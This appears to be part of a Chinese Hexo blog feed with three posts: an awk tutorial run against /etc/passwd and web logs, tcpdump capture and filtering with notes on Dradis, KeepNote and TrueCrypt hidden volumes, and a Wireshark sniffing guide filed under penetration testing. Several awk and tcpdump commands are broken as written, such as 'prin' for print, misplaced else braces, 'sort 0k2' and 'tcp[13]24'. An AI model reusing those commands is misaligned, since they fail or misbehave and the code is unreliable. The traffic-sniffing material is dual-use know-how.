class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 模式可以是</span></span><br><span class="line">=======   正则表达式</span><br><span class="line"><span class="comment"># 匹配记录（整行）</span></span><br><span class="line">awk <span class="string">'/^xps/'</span> /etc/passwd   <span class="comment"># awk '$0 ~ /^xps/' /etc/passwd   # ~  匹配</span></span><br><span class="line">awk <span class="string">'!/xps/'</span> /etc/passwd   <span class="comment"># awk '$0 !~ /^xps/' /etc/passwd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配字段：匹配操作符(~!~)</span></span><br><span class="line">awk -F: <span class="string">'$1 ~ /^xps/'</span> /etc/passwd   <span class="comment"># </span></span><br><span class="line">awk -F: <span class="string">'$NF !~ /^bash$/'</span> /etc/passwd  <span class="comment"># 最后一列不是以bash结尾的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   比较表达式</span><br><span class="line"><span class="comment"># 用于比较 数字 与 字符串</span></span><br><span class="line"><span class="comment"># &gt;     &lt;    == </span></span><br><span class="line">awk -F: <span class="string">'$3 == 0'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'$3 == "/xps/"'</span> /etc/passwd  <span class="comment"># == 全部等于</span></span><br><span class="line">awk -F: <span class="string">'$3 ~ /xps/'</span> /etc/passwd  <span class="comment"># 正则匹配</span></span><br><span class="line">awk -F: <span class="string">'$NF ~ /xps/'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   条件表达式</span><br><span class="line">awk -F: <span class="string">'$3&gt;200&#123;print $0&#125;'</span> /etc/passwd  <span class="comment"># $3大于200的，$0</span></span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">'&#123; if($3&gt;200) &#123;print $0&#125; &#125;'</span> /etc/passwd  <span class="comment"># 推荐这么写 &#123; if()&#123;cmd1;cmd2&#125; else&#123;&#125; &#125;</span></span><br><span class="line">awk -F: <span class="string">'&#123; if($3&gt;200) &#123;print $0&#125; else&#123;print $1&#125; &#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   算数运算</span><br><span class="line"><span class="comment">#awk都按浮点数方式执行算数运算</span></span><br><span class="line">awk -F: <span class="string">'$3 * 10 &gt; 500'</span> /etc/passwd    </span><br><span class="line">awk -F: <span class="string">'&#123; if($3*10&gt;500)&#123;print $0&#125; &#125;'</span> /etc/passwd    <span class="comment"># 如果$3*10&gt;500，就...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   逻辑操作符和复合模式</span><br><span class="line">&amp;&amp; 逻辑与</span><br><span class="line">||  逻辑或</span><br><span class="line">！  逻辑非</span><br><span class="line">awk -F: <span class="string">'$1~/root/ &amp;&amp; $3&lt;=15'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'$1~/root/ || $3&lt;=15'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'!($1~/root/ &amp;&amp; $3&lt;=15)'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   范围模式</span><br><span class="line">awk <span class="string">'/Tom,/Susan/'</span> filename</span><br></pre></td></tr></table></figure><p><strong>awk脚本编程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### awk脚本编程</span></span><br><span class="line"></span><br><span class="line">====== 条件编程</span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if()&#123;&#125; else if()&#123;&#125; else&#123;&#125;&#125;'</span> passwd</span><br><span class="line"></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if($3&gt;0 &amp;&amp; $3&lt;1000)&#123;count++&#125;&#125; END&#123;print count&#125;'</span> /etc/passwd   <span class="comment"># 统计系统用户数</span></span><br><span class="line"></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if($3==0)&#123;count++&#125;&#125; else&#123;i++&#125; END&#123;print "管理员个数："count; print "系统用户个数:"i&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if($3==0)&#123;i++&#125;&#125; else if($3&lt;999)&#123;j++&#125; else&#123;k++&#125; END&#123;print "管理员个数："i; print "普通用户个数:"j; print "系统用户个数:"k&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">====== 循环</span><br><span class="line"><span class="comment"># 1.while    依此打印每一列</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;i=1;while(i&lt;7)&#123;print $i;i++&#125;&#125;'</span> /etc/passwd </span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'/^root/&#123;i=1;while(i&lt;7)&#123;print $i;i++&#125;&#125;'</span> /etc/passwd </span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;i=1;while(i&lt;=NF)&#123;print $i;i++&#125;&#125;'</span> /etc/passwd </span><br><span class="line">awk <span class="string">'&#123;i=1;while(i&lt;=NF)&#123;print $i;i++&#125;&#125;'</span> a.txt   <span class="comment"># 打印文件所有内容(默认是空格和tab分割)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.for</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;for(i=1;i&lt;=5;i++)&#123;prin i&#125;&#125;'</span>     <span class="comment"># c风格的</span></span><br><span class="line">awk -F: <span class="string">'&#123;for(i=1;i&lt;=NF;i++)&#123;prin $i&#125;&#125;'</span> passwd</span><br><span class="line">awk -F: <span class="string">'&#123;for(i=1;i&lt;=NF;i++)&#123;prin $0&#125;&#125;'</span> passwd     <span class="comment"># 将每行打印10次</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">====== 数组  (用来统计)</span><br><span class="line">awk -F: <span class="string">'&#123;username[++i]=$1&#125; END&#123;print username[1]&#125;'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'&#123;username[i++]=$1&#125; END&#123;print username[1]&#125;'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'&#123;username[i++]=$1&#125; END&#123;print username[0]&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">## 数组遍历(主要用按索引遍历)</span></span><br><span class="line"><span class="comment"># username数组名， 先保存到数组中，再进行遍历</span></span><br><span class="line">awk -F: <span class="string">'&#123;username[i++]=$1&#125; END&#123;for(i in username) &#123;print i,username[i]&#125;&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">'&#123;username[++i]=$1&#125; END&#123;for(i in username) &#123;print i,username[i]&#125;&#125;'</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>基本练习</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### 基本练习</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 1. 统计/etc/passwd 中各种shell的数量</span></span><br><span class="line"><span class="comment"># # 把要统计的对象作为数组的索引(这里是最后一个$NF,也就是shell的类型)</span></span><br><span class="line">awk -F: <span class="string">'&#123;shells[$NF]++&#125; END&#123;for(i in shells)&#123;print i,shells[i]&#125;&#125;'</span> /etc/passwd  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.网站访问状态统计</span></span><br><span class="line">netstat -ant |grep :80 |awk <span class="string">'&#123;access_stat[$NF]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;'</span> </span><br><span class="line"></span><br><span class="line">netstat -ant |grep :80 |awk <span class="string">'&#123;access_stat[$NF]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;'</span> |sort -k2 -n |head</span><br><span class="line"></span><br><span class="line">ss -ant |grep :80 |awk <span class="string">'&#123;access_stat[$2]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;'</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 3.统计当前访问的每个IP的数量 &lt;当前实时状态 netstat, ss&gt;</span></span><br><span class="line">netstat -ant |grep :80 |awk -F: <span class="string">'&#123;ip_count[$8]++&#125; END&#123;for(i in ip_count)&#123;print i,ip_count[i]&#125;&#125;'</span> </span><br><span class="line"><span class="comment"># 下面这个有点复杂了，不推荐用</span></span><br><span class="line">ss -ant |grep :80 |awk -F: <span class="string">'!/LISTEN/&#123;ip_count[$(NF-1)]++&#125; END&#123;for(i in ip_count)&#123;print i,ip_count[i]&#125;&#125;'</span> |sort 0k2 -rn |head 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 4.统计Apache/Nginx日志中某一天的PV量 &lt;统计日志&gt;</span></span><br><span class="line">grep <span class="string">'07/Aug/2019'</span> access.log |wc -l    <span class="comment"># wc -l  统计行数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 4.统计Apache/Nginx日志中某一天不通IP的PV量 &lt;统计日志&gt;</span></span><br><span class="line">grep <span class="string">'07/Aug/2019'</span> access.log |awk <span class="string">'&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'</span> |sort -k2 -rn | head</span><br><span class="line"></span><br><span class="line">awk <span class="string">'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt;100的才打印（此方法有点low，可用下面的几种方法）</span></span><br><span class="line">awk <span class="string">'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'</span> | awk <span class="string">'$2&gt;100'</span> |sort -k2 -rn | head  </span><br><span class="line"></span><br><span class="line">awk <span class="string">'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;if(ips[i]&gt;100)&#123;print i, ips[i]&#125;&#125;&#125;'</span> | </span><br><span class="line"><span class="comment"># &gt;100的才打印</span></span><br><span class="line">awk <span class="string">'$2&gt;100'</span> |sort -k2 -rn | head  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#【思路】 将要统计的字段作为数组的索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### awk函数</span></span><br><span class="line"><span class="comment"># 统计用户名为4个字符的用户</span></span><br><span class="line">awk -F: <span class="string">'$1~/^....$/&#123;count++;print $1&#125; END&#123;print "count is:" count&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment"># length</span></span><br><span class="line">awk -F: <span class="string">'length($1)==4&#123;count++;print $1&#125; END&#123;print "count is:" count&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### awk自定义变量(外部变量)</span></span><br><span class="line"><span class="comment"># 1.再双引号里面</span></span><br><span class="line">var=bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"unix script"</span> |awk <span class="string">"gsub(/unix/, \"<span class="variable">$var</span>\")"</span>   <span class="comment"># 转义双引号，里面是$变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.两个双引号里面套个单引号</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"unix script"</span> |awk <span class="string">'gsub(/unix/, "'</span><span class="string">"<span class="variable">$var</span>\"'"</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">df -h |awk '</span>&#123; <span class="keyword">if</span>(int(<span class="variable">$5</span>)&gt;10)&#123;<span class="built_in">print</span> <span class="variable">$6</span><span class="string">":"</span><span class="variable">$5</span>&#125; &#125;<span class="string">'</span></span><br><span class="line"><span class="string"># 再函数外面单引号情况下</span></span><br><span class="line"><span class="string">i=10</span></span><br><span class="line"><span class="string">df -h |awk '</span>&#123; <span class="keyword">if</span>(int(<span class="variable">$5</span>)&gt;<span class="string">''</span><span class="string">'$i'</span><span class="string">''</span>)&#123;<span class="built_in">print</span> <span class="variable">$6</span><span class="string">":"</span><span class="variable">$5</span>&#125; &#125;<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3.建议： -v</span></span><br><span class="line"><span class="string">awk -v user=root -F:'</span><span class="variable">$1</span> == user<span class="string">' /etc/passwd  # 在-v的时候定义变量user=root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var=bash</span></span><br><span class="line"><span class="string">echo "unix script" |awk "gsub(/unix/, var)" </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 前面造一条命令，传给bash执行</span></span><br><span class="line"><span class="string">arp -n |awk '</span>/^[0-9]/&#123;<span class="built_in">print</span> <span class="string">"arp -d <span class="variable">$1</span>"</span>&#125;<span class="string">' |bash</span></span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>实践中再写…..</p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>其他参考文章：</p><p><a href="https://blog.csdn.net/u011436427/article/details/103815680" target="_blank" rel="noopener">https://blog.csdn.net/u011436427/article/details/103815680</a></p><p><a href="https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/shell脚本基本知识/title.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="Shell" scheme="http://www.xpshuai.cn/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>工具 - tcpdump使用&amp;过程文档记录</title>
    <link href="http://www.xpshuai.cn/%E5%B7%A5%E5%85%B7-tcpdump%E4%BD%BF%E7%94%A8&amp;%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.xpshuai.cn/工具-tcpdump使用&amp;过程文档记录/</id>
    <published>2020-03-15T10:50:35.000Z</published>
    <updated>2020-03-15T10:51:13.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具-tcpdump使用"><a href="#工具-tcpdump使用" class="headerlink" title="工具-tcpdump使用"></a><font color="red">工具-tcpdump使用</font></h1><ul><li><p>No_GUI的抓包分析工具</p></li><li><p>Linux、Unix系统默认安装</p></li></ul><h6 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h6><p>默认只抓68个字节<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参数:  -i网卡    -s 抓包大小   -w保存到文件</span></span><br><span class="line">tcpdump -i ens33 -s 0 -w file.pcap</span><br><span class="line"></span><br><span class="line"><span class="comment">#抓取指定端口的流量</span></span><br><span class="line">tcpdump -i ens33 port 22</span><br></pre></td></tr></table></figure></p><h6 id="读取抓包文件"><a href="#读取抓包文件" class="headerlink" title="读取抓包文件"></a>读取抓包文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看保存到文件中的数据包</span></span><br><span class="line">tcpdump -r file.pcap</span><br><span class="line"><span class="comment">#参数： -A 以ascii码形式显示内容</span></span><br><span class="line">tcpdump -A -r file.pcap</span><br><span class="line"><span class="comment">#参数： -X 以16进制形式显示内容</span></span><br><span class="line">tcpdump -X -r file.pcap</span><br></pre></td></tr></table></figure><h6 id="显示筛选器"><a href="#显示筛选器" class="headerlink" title="显示筛选器"></a>显示筛选器</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用OS自带的管道</span></span><br><span class="line"><span class="comment">#参数： -n 以ip地址显示，不显示域名；   显示第三列(ip+端口)并去重</span></span><br><span class="line">tcpdump -n -r file.pcap | awk <span class="string">'&#123;print $3&#125;'</span> | sort -u</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcpdump自身的显示筛选： 只显示源地址为这个的</span></span><br><span class="line">tcpdump -n -src host 192.168.0.1 -r file.pcap</span><br><span class="line"><span class="comment">#只显示目的地址为这个的</span></span><br><span class="line">tcpdump -n -dst host 192.168.0.130 -r file.pcap</span><br><span class="line"><span class="comment">#按端口号筛选</span></span><br><span class="line">tcpdump -n port 53 -r file.pcap</span><br><span class="line"><span class="comment">#显示udp的53端口</span></span><br><span class="line">tcpdump -n udp port 53 -r file.pcap</span><br><span class="line"><span class="comment">#显示tcp的</span></span><br><span class="line">tcpdump -n tcp port 80 -r file.pcap</span><br><span class="line"><span class="comment">#显示icmp的</span></span><br><span class="line">tcpdump -n icmp -r file.pcap</span><br><span class="line"><span class="comment">#显示ip的</span></span><br><span class="line">tcpdump -n ip -r file.pcap</span><br><span class="line"><span class="comment">#-X以16进制显示</span></span><br><span class="line">tcpdump -nX port 80 -r file.pcap</span><br></pre></td></tr></table></figure><h6 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h6><p>TCP的包头：<br><img src="/工具-tcpdump使用&过程文档记录/20200315180543581_5798.png" alt><br>可以看到上图中Flag中的标志位<br>tcpdump可以对如此细致的东西进行筛选  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只显示第13号字节中值转换为10进制为24(push+ack)的数据包</span></span><br><span class="line">tcpdump -A -n <span class="string">'tcp[13]24'</span> -r file.cap</span><br></pre></td></tr></table></figure><blockquote><p>PS:  nc、Wireshark、tcpdump必须非常熟练地掌握</p></blockquote><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具 "></a><font color="red">过程文档记录工具 </font></h1><p>介绍几个kali中自带的</p><h6 id="1-Dradis"><a href="#1-Dradis" class="headerlink" title="1.Dradis"></a>1.Dradis</h6><p>基于web的工具</p><ul><li>短期临时小团队资源共享</li><li>各种插件导入文件（兼容很多种扫描器日志的导入）</li></ul><p><strong>使用：</strong><br>webapp<br>初始化后，输入密码即可登录<br>导入导出(支持不同文件格式)扫描器日志<br>（具体自己操作一下就知道了）</p><h6 id="2-Keepnote"><a href="#2-Keepnote" class="headerlink" title="2.Keepnote"></a>2.Keepnote</h6><p>层级化记录信息：<br>不同项目可以使用不同文件夹，子文件<br>可以导出</p><h6 id="3-Truecrypt"><a href="#3-Truecrypt" class="headerlink" title="3.Truecrypt"></a>3.Truecrypt</h6><p>一款<code>加密工具</code><br>2014年停止更新（官方原因是安全性不够，但实际使用却依然较安全）</p><p><strong>选择加密区域：</strong><br>1.创建加密文件（create volume）<br>2.创建卷(全盘加密)  </p><p><strong>选择加密方式</strong><br>1.标准加密卷：<br>2.隐藏加密卷： 若被人强迫输入加密密码，可以输入一个密码打开后什么都没有(outer volume), 而重要信息存在一块隐藏空间(hidden volume)里面。hidden volume大小不能超过outer volume。【首先指定外部卷(迷惑别人的)的大小(尽量大一些,包括内部卷的大小)和密码, 内部机密卷存在于外部卷的空间中(设置它的大小和密码)】</p><p>选择加密算法（也可以多种加密算法叠加用）<br>设置密码<br>指定卷格式<br>生成随机key(用鼠标再屏幕上乱滑,划得月乱，key越复杂)</p><p><strong>使用：</strong><br>选择挂载的文件，就像挂载一块硬盘分区一样<br>使用完成后：<code>dismount</code>或<code>dismount all</code>就行</p><p>对于隐藏加密卷: 输入外部卷的密码就是外部卷的内容(存储大小也隐藏了另一部分)，输入内部卷的密码打开的就是内部卷的内容</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具-tcpdump使用&quot;&gt;&lt;a href=&quot;#工具-tcpdump使用&quot; class=&quot;headerlink&quot; title=&quot;工具-tcpdump使用&quot;&gt;&lt;/a&gt;&lt;font color=&quot;red&quot;&gt;工具-tcpdump使用&lt;/font&gt;&lt;/h1&gt;&lt;ul&gt;
&lt;li
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="tcpdump" scheme="http://www.xpshuai.cn/tags/tcpdump/"/>
    
  </entry>
  
  <entry>
    <title>工具 - Wireshark使用</title>
    <link href="http://www.xpshuai.cn/%E5%B7%A5%E5%85%B7-Wireshark%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.xpshuai.cn/工具-Wireshark使用/</id>
    <published>2020-03-15T07:50:21.000Z</published>
    <updated>2020-03-15T08:01:24.454Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/工具-Wireshark使用/title.png"></p><a id="more"></a><h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>抓包嗅探协议分析</li><li>安全专家必备技能</li><li>抓包引擎(wireshark本身是分析数据包, 抓包靠下面两个引擎)<ul><li>Linux上： Libpcap</li><li>Windows上： Winpcap</li></ul></li><li>解码能力（衡量抓包软件好坏的重要标准）</li></ul><h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h2><h6 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h6><h6 id="捕获-gt-选项-gt-…-…"><a href="#捕获-gt-选项-gt-…-…" class="headerlink" title="捕获-&gt;选项-&gt; … …"></a>捕获-&gt;选项-&gt; … …</h6><p><strong>选择抓包网卡</strong><br><img src="/工具-Wireshark使用/20200314214656188_15241.png" alt></p><p><strong>混杂模式</strong><br>勾选上之后，如果数据包不是发送给我指定这个网卡的，也会被抓取</p><p><strong>抓包筛选器</strong><br>指定抓什么包，不抓什么包</p><h6 id="实时抓包"><a href="#实时抓包" class="headerlink" title="实时抓包"></a>实时抓包</h6><p>就是主界面</p><h6 id="保存和分析捕获文件"><a href="#保存和分析捕获文件" class="headerlink" title="保存和分析捕获文件"></a>保存和分析捕获文件</h6><p>先停止，再保存(可以选择格式, 尽量使用<code>.pcap</code>格式)，压缩等, 下次可以导入已经抓取的数据包文件</p><h6 id="首选项"><a href="#首选项" class="headerlink" title="首选项"></a>首选项</h6><p>编辑-&gt;首选项   -&gt; 可以自己根据需要修改和定制界面布局<br><img src="/工具-Wireshark使用/20200314215811593_19130.png" alt><br><img src="/工具-Wireshark使用/20200314215743991_3733.png" alt></p><h4 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h4><ul><li>过滤干扰的数据包</li><li>抓包筛选器(捕获, 选项里面那个)</li><li>显示筛选器(主界面那个, 更多使用)    – 常用语法</li></ul><p>可以单独选择，也可以叠加(and, or)上面的条件进行筛选：<br><img src="/工具-Wireshark使用/20200314220435486_29854.png" alt><br><img src="/工具-Wireshark使用/20200314220819061_8554.png" alt></p><h2 id="常见协议数据包"><a href="#常见协议数据包" class="headerlink" title="常见协议数据包"></a>常见协议数据包</h2><p>数据包的分层结构显示</p><h6 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a><font color="red">ARP</font></h6><p><img src="/工具-Wireshark使用/20200315135242728_2582.png" alt><br><img src="/工具-Wireshark使用/20200315135851907_10980.png" alt></p><h6 id="IP"><a href="#IP" class="headerlink" title=" IP"></a><font color="red"> IP</font></h6><p><strong>Protocol字段：</strong> 表示上层是： udp–&gt; 17， tcp–&gt; 6, icmp –&gt;2, igmp –&gt;2<br>四层有好多中协议对应不同的数字<br>Header checksum字段：校验和, 每两位进行异或<br><img src="/工具-Wireshark使用/20200315141145151_10461.png" alt><br>tcp和udp一般不会有<code>option</code>字段（视情况而定）</p><h6 id="TCP"><a href="#TCP" class="headerlink" title=" TCP"></a><font color="red"> TCP</font></h6><p><img src="/工具-Wireshark使用/20200315141900321_8252.png" alt><br><img src="/工具-Wireshark使用/20200315142047940_28399.png" alt></p><p><strong>附：</strong><br>三次握手<br><img src="/工具-Wireshark使用/20200315142429852_2643.png" alt></p><p>四次挥手<br><img src="/工具-Wireshark使用/20200315142522647_28638.png" alt></p><h6 id="UDP"><a href="#UDP" class="headerlink" title=" UDP "></a><font color="red"> UDP </font></h6><p>udp和tcp的类似，自己实践能看懂<br>udp开销更小<br><img src="/工具-Wireshark使用/20200315142800334_28041.png" alt></p><h6 id="DNS"><a href="#DNS" class="headerlink" title=" DNS "></a><font color="red"> DNS </font></h6><p>应用层协议，基于udp<br><img src="/工具-Wireshark使用/20200315143306840_10579.png" alt></p><h6 id="HTTP"><a href="#HTTP" class="headerlink" title=" HTTP "></a><font color="red"> HTTP </font></h6><p><img src="/工具-Wireshark使用/20200315143952274_22660.png" alt><br><img src="/工具-Wireshark使用/20200315144406111_24695.png" alt></p><h6 id="ftp"><a href="#ftp" class="headerlink" title=" ftp "></a><font color="red"> ftp </font></h6><p>这里没ftp服务器就先不放图了<br>ftp也是一个应用层协议</p><blockquote><p>wishark默认是用端口区分协议(假设我们手动把http不开在80端口，wireshark分不清非标准端口的, 需要我们手动修改.如下图.)</p></blockquote><p><img src="/工具-Wireshark使用/20200315144657089_4217.png" alt></p><h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>比如访问一个网页, 往往产生很多数据包<br>wireshark提供了<code>数据流</code></p><ul><li>http</li><li>smtp</li><li>pop3</li><li>ssl 等</li></ul><p><strong>操作(以http为例)：</strong><br><img src="/工具-Wireshark使用/20200315145059801_20372.png" alt><br>按照上图操作完后，会来到数据流的界面，如下：<br><img src="/工具-Wireshark使用/20200315145205546_28877.png" alt></p><h2 id="信息统计"><a href="#信息统计" 